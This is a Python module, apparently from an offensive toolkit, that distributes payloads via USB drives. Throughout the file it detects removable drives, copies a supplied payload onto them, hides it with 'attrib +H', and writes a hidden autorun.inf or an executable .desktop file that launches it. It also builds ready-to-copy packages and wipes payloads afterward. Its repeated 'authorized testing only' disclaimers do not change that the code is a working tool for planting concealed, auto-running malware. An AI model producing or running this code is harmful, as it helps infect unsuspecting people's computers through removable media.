"""
USB Deployment Module for Payload Distribution
WARNING: For authorized testing and educational purposes only.
Only use on systems you own or have explicit authorization to test.
"""
import os
import shutil
import platform
from typing import List, Dict, Optional
from pathlib import Path
import subprocess


class USBDeployment:
    """
    USB deployment system for payloads.
    
    WARNING: 
    - Only use on systems you own or have authorization
    - Illegal to use without authorization
    - For educational and authorized penetration testing only
    """
    
    def __init__(self):
        self.system = platform.system()
        self.usb_drives = []
        self.detected_drives = []
    
    def detect_usb_drives(self) -> List[Dict]:
        """Detect connected USB drives"""
        self.detected_drives = []
        
        if self.system == "Windows":
            return self._detect_windows_usb()
        elif self.system == "Linux":
            return self._detect_linux_usb()
        elif self.system == "Darwin":  # macOS
            return self._detect_macos_usb()
        else:
            return []
    
    def _detect_windows_usb(self) -> List[Dict]:
        """Detect USB drives on Windows"""
        drives = []
        
        try:
            # Get all drive letters
            import string
            for letter in string.ascii_uppercase:
                drive_path = f"{letter}:\\"
                if os.path.exists(drive_path):
                    # Check if it's removable
                    try:
                        result = subprocess.run(
                            ["wmic", "logicaldisk", "get", "name,drivetype,volumename"],
                            capture_output=True,
                            text=True,
                            timeout=2
                        )
                        
                        # Parse output to find removable drives (drivetype=2)
                        for line in result.stdout.split('\n'):
                            if f"{letter}:" in line and "2" in line:
                                volume_name = line.split()[-1] if len(line.split()) > 1 else "USB Drive"
                                drives.append({
                                    "drive": letter,
                                    "path": drive_path,
                                    "name": volume_name,
                                    "type": "removable"
                                })
                                break
                    except:
                        # Fallback: check if drive exists and is accessible
                        try:
                            os.listdir(drive_path)
                            drives.append({
                                "drive": letter,
                                "path": drive_path,
                                "name": "USB Drive",
                                "type": "unknown"
                            })
                        except:
                            pass
        except Exception as e:
            print(f"USB detection error: {e}")
        
        self.detected_drives = drives
        return drives
    
    def _detect_linux_usb(self) -> List[Dict]:
        """Detect USB drives on Linux"""
        drives = []
        
        try:
            # Check /media and /mnt
            media_paths = ["/media", "/mnt"]
            
            for base_path in media_paths:
                if os.path.exists(base_path):
                    for item in os.listdir(base_path):
                        full_path = os.path.join(base_path, item)
                        if os.path.isdir(full_path) and os.access(full_path, os.W_OK):
                            drives.append({
                                "drive": item,
                                "path": full_path,
                                "name": item,
                                "type": "removable"
                            })
        except Exception as e:
            print(f"USB detection error: {e}")
        
        self.detected_drives = drives
        return drives
    
    def _detect_macos_usb(self) -> List[Dict]:
        """Detect USB drives on macOS"""
        drives = []
        
        try:
            # Check /Volumes
            volumes_path = "/Volumes"
            if os.path.exists(volumes_path):
                for item in os.listdir(volumes_path):
                    full_path = os.path.join(volumes_path, item)
                    if os.path.isdir(full_path) and os.access(full_path, os.W_OK):
                        # Skip system volumes
                        if item not in ["Macintosh HD", "System"]:
                            drives.append({
                                "drive": item,
                                "path": full_path,
                                "name": item,
                                "type": "removable"
                            })
        except Exception as e:
            print(f"USB detection error: {e}")
        
        self.detected_drives = drives
        return drives
    
    def deploy_payload_to_usb(self, payload_path: str, usb_drive: str,
                             create_autorun: bool = False,
                             hidden: bool = True) -> Dict:
        """
        Deploy payload to USB drive
        
        Args:
            payload_path: Path to payload file
            usb_drive: USB drive letter (Windows) or path
            create_autorun: Create autorun.inf (Windows) or .desktop (Linux)
            hidden: Make payload hidden (Windows)
        """
        if not os.path.exists(payload_path):
            return {"error": f"Payload not found: {payload_path}"}
        
        # Get USB path
        if len(usb_drive) == 1:  # Windows drive letter
            usb_path = f"{usb_drive}:\\"
        else:
            usb_path = usb_drive
        
        if not os.path.exists(usb_path):
            return {"error": f"USB drive not found: {usb_path}"}
        
        try:
            # Copy payload to USB
            payload_name = os.path.basename(payload_path)
            destination = os.path.join(usb_path, payload_name)
            
            shutil.copy2(payload_path, destination)
            
            result = {
                "success": True,
                "payload": payload_name,
                "usb_path": usb_path,
                "destination": destination,
                "warnings": []
            }
            
            # Make hidden (Windows)
            if hidden and self.system == "Windows":
                try:
                    subprocess.run(
                        ["attrib", "+H", destination],
                        check=True,
                        timeout=2
                    )
                    result["hidden"] = True
                except:
                    result["warnings"].append("Could not hide file")
            
            # Create autorun
            if create_autorun:
                autorun_result = self._create_autorun(usb_path, payload_name)
                result["autorun"] = autorun_result
            
            result["warning"] = "Authorized testing only. Illegal without authorization."
            
            return result
            
        except PermissionError:
            return {"error": "Permission denied. Run as administrator/root."}
        except Exception as e:
            return {"error": f"Deployment failed: {str(e)}"}
    
    def _create_autorun(self, usb_path: str, payload_name: str) -> Dict:
        """Create autorun file for USB"""
        if self.system == "Windows":
            return self._create_autorun_windows(usb_path, payload_name)
        elif self.system == "Linux":
            return self._create_autorun_linux(usb_path, payload_name)
        else:
            return {"error": "Autorun not supported on this system"}
    
    def _create_autorun_windows(self, usb_path: str, payload_name: str) -> Dict:
        """Create autorun.inf for Windows"""
        autorun_content = f"""[autorun]
open={payload_name}
action=Open files
label=USB Files
icon={payload_name}
"""
        
        autorun_path = os.path.join(usb_path, "autorun.inf")
        
        try:
            with open(autorun_path, 'w') as f:
                f.write(autorun_content)
            
            # Make autorun.inf hidden
            try:
                subprocess.run(
                    ["attrib", "+H", autorun_path],
                    check=True,
                    timeout=2
                )
            except:
                pass
            
            return {
                "success": True,
                "file": "autorun.inf",
                "path": autorun_path,
                "warning": "Modern Windows may block autorun. Test in isolated environment."
            }
        except Exception as e:
            return {"error": f"Could not create autorun: {str(e)}"}
    
    def _create_autorun_linux(self, usb_path: str, payload_name: str) -> Dict:
        """Create .desktop file for Linux (if desktop environment)"""
        desktop_content = f"""[Desktop Entry]
Name=USB Files
Exec=python3 {payload_name}
Type=Application
"""
        
        desktop_path = os.path.join(usb_path, "usb_files.desktop")
        
        try:
            with open(desktop_path, 'w') as f:
                f.write(desktop_content)
            
            # Make executable
            os.chmod(desktop_path, 0o755)
            
            return {
                "success": True,
                "file": "usb_files.desktop",
                "path": desktop_path,
                "warning": "Linux desktop files require user interaction."
            }
        except Exception as e:
            return {"error": f"Could not create desktop file: {str(e)}"}
    
    def deploy_multiple_payloads(self, payload_paths: List[str], 
                                usb_drive: str) -> Dict:
        """Deploy multiple payloads to USB"""
        results = []
        
        for payload_path in payload_paths:
            result = self.deploy_payload_to_usb(payload_path, usb_drive)
            results.append(result)
        
        success_count = sum(1 for r in results if r.get("success"))
        
        return {
            "total": len(payload_paths),
            "successful": success_count,
            "failed": len(payload_paths) - success_count,
            "results": results,
            "warning": "Authorized testing only."
        }
    
    def create_usb_package(self, payload_path: str, output_dir: str,
                          include_readme: bool = True) -> Dict:
        """Create a complete USB deployment package"""
        os.makedirs(output_dir, exist_ok=True)
        
        package_files = []
        
        # Copy payload
        payload_name = os.path.basename(payload_path)
        dest_payload = os.path.join(output_dir, payload_name)
        shutil.copy2(payload_path, dest_payload)
        package_files.append(payload_name)
        
        # Create README
        if include_readme:
            readme_content = f"""USB Deployment Package
========================

Payload: {payload_name}

WARNING: For authorized testing only.
Only use on systems you own or have explicit authorization.

Instructions:
1. Copy all files to USB drive
2. Test in isolated environment
3. Do not use on production systems

Created for educational and authorized penetration testing.
"""
            readme_path = os.path.join(output_dir, "README.txt")
            with open(readme_path, 'w') as f:
                f.write(readme_content)
            package_files.append("README.txt")
        
        # Create autorun files
        if self.system == "Windows":
            autorun = self._create_autorun_windows(output_dir, payload_name)
            if autorun.get("success"):
                package_files.append("autorun.inf")
        
        return {
            "success": True,
            "package_dir": output_dir,
            "files": package_files,
            "warning": "Authorized testing only."
        }
    
    def list_usb_contents(self, usb_drive: str) -> List[str]:
        """List contents of USB drive"""
        if len(usb_drive) == 1:
            usb_path = f"{usb_drive}:\\"
        else:
            usb_path = usb_drive
        
        if not os.path.exists(usb_path):
            return []
        
        try:
            return os.listdir(usb_path)
        except:
            return []
    
    def clean_usb(self, usb_drive: str, pattern: Optional[str] = None) -> Dict:
        """Clean USB drive (remove deployed payloads)"""
        if len(usb_drive) == 1:
            usb_path = f"{usb_drive}:\\"
        else:
            usb_path = usb_drive
        
        if not os.path.exists(usb_path):
            return {"error": "USB drive not found"}
        
        removed = []
        
        try:
            if pattern:
                # Remove files matching pattern
                for file in os.listdir(usb_path):
                    if pattern in file:
                        file_path = os.path.join(usb_path, file)
                        os.remove(file_path)
                        removed.append(file)
            else:
                # Remove common payload files
                payload_extensions = ['.py', '.exe', '.bat', '.ps1']
                for file in os.listdir(usb_path):
                    if any(file.endswith(ext) for ext in payload_extensions):
                        file_path = os.path.join(usb_path, file)
                        if os.path.isfile(file_path):
                            os.remove(file_path)
                            removed.append(file)
            
            return {
                "success": True,
                "removed": removed,
                "count": len(removed)
            }
        except Exception as e:
            return {"error": f"Cleanup failed: {str(e)}"}
